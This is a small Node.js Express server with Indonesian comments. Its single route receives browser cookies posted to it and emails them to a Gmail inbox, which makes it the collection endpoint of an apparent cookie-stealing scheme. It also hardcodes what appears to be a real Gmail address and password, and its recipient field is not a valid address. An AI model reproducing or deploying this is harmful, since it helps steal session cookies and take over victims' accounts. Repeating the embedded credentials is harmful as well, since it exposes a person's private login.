const express = require('express');
const nodemailer = require('nodemailer');
const bodyParser = require('body-parser');
const app = express();
const port = 3000;

app.use(bodyParser.json());

app.post('/send-cookies', (req, res) => {
    const cookies = req.body.cookies;

    // Konfigurasi email
    const transporter = nodemailer.createTransport({
        service: 'gmail',
        auth: {
            user: 'galangsurya289@gmail.com',  // Ganti dengan alamat email Anda
            pass: 'galangsurya1309'     // Ganti dengan password email Anda
        }
    });

    const mailOptions = {
        from: 'galangsurya289@gmail.com',  // Ganti dengan alamat email Anda
        to: 'galangsurya1309',    // Ganti dengan alamat email Anda
        subject: 'Cookies',
        text: cookies
    };

    transporter.sendMail(mailOptions, (error, info) => {
        if (error) {
            console.log(error);
            res.status(500).send('Error sending email');
        } else {
            console.log('Email sent: ' + info.response);
            res.status(200).send('Email sent');
        }
    });
});

app.listen(port, () => {
    console.log(`Server running at http://localhost:${port}`);
});
